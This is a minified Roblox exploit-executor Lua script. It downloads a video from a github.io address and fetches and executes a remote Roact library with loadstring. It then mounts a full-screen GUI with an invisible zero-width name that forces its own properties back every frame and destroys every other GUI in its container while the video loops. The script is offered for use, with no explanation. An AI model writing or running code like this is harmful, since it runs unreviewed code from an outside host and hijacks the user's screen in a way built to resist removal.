local a=game:GetService'RunService'local b=game:HttpGet
'https://seva3125.github.io/insanity/v.mp4'local c=""local d=tostring(math.
random(1,1e12))..'.webm'local e=tostring(math.random(1,1e12))..'.mp3'writefile(d
,b)writefile(e,c)local f=loadstring(game:HttpGet
[[https://raw.githubusercontent.com/seva3125/roblox-libs/refs/heads/main/Roact.lua]]
)()local function protect_gui(g)local h=game:GetService'Players'local i=game:
GetService'CoreGui'local j={'\u{200b}','\u{200c}','\u{200d}','\u{2060}',
'\u{2062}','\u{2063}','\u{feff}'}local k=''for l=1,math.random(6,12)do k..=j[
math.random(1,#j)]end local l=(gethui and gethui())or i or(h.LocalPlayer and h.
LocalPlayer:FindFirstChildOfClass'PlayerGui')if not l then return end g.Name=k g
.Parent=l g.Archivable=false if g:IsA'ScreenGui'then g.ZIndexBehavior=Enum.
ZIndexBehavior.Global g.DisplayOrder=0x7fffffff g.ResetOnSpawn=false g.
IgnoreGuiInset=true end local m={Parent=l,Name=k,Archivable=false,ZIndexBehavior
=Enum.ZIndexBehavior.Global,DisplayOrder=0x7fffffff,ResetOnSpawn=false,
IgnoreGuiInset=true}if not g:IsA'ScreenGui'then m.ZIndexBehavior,m.DisplayOrder,
m.ResetOnSpawn,m.IgnoreGuiInset=nil,nil,nil,nil end for n,o in pairs(m)do g:
GetPropertyChangedSignal(n):Connect(function()if g[n]~=o then pcall(function()g[
n]=o end)end end)end g.AncestryChanged:Connect(function()if g.Parent~=l then
pcall(function()g.Parent=l end)end end)local n n=a.Heartbeat:Connect(function()
for o,p in pairs(m)do if g[o]~=p then pcall(function()g[o]=p end)end end if not
g.Parent then n:Disconnect()end end)return g end local g=protect_gui(Instance.
new'ScreenGui')local h=f.Component:extend'App'function h.init(i)i.vidRef=f.
createRef()end function h.didMount(i)local j=i.vidRef:getValue()task.spawn(
function()if j then j.Loaded:Wait()j.TimePosition=0 j:Play()end end)i._guiGuard=
a.Heartbeat:Connect(function()for k,l in ipairs(g.Parent:GetChildren())do if l~=
g then pcall(function()l:Destroy()end)end end end)end function h.willUnmount(i)
if i._guiGuard then i._guiGuard:Disconnect()end end function h.render(i)return f
.createFragment{Video=f.createElement('VideoFrame',{Size=UDim2.fromScale(1,1),
BackgroundTransparency=1,Video=getcustomasset(d),Looped=true,[f.Ref]=i.vidRef})}
end f.mount(f.createElement(h),g)
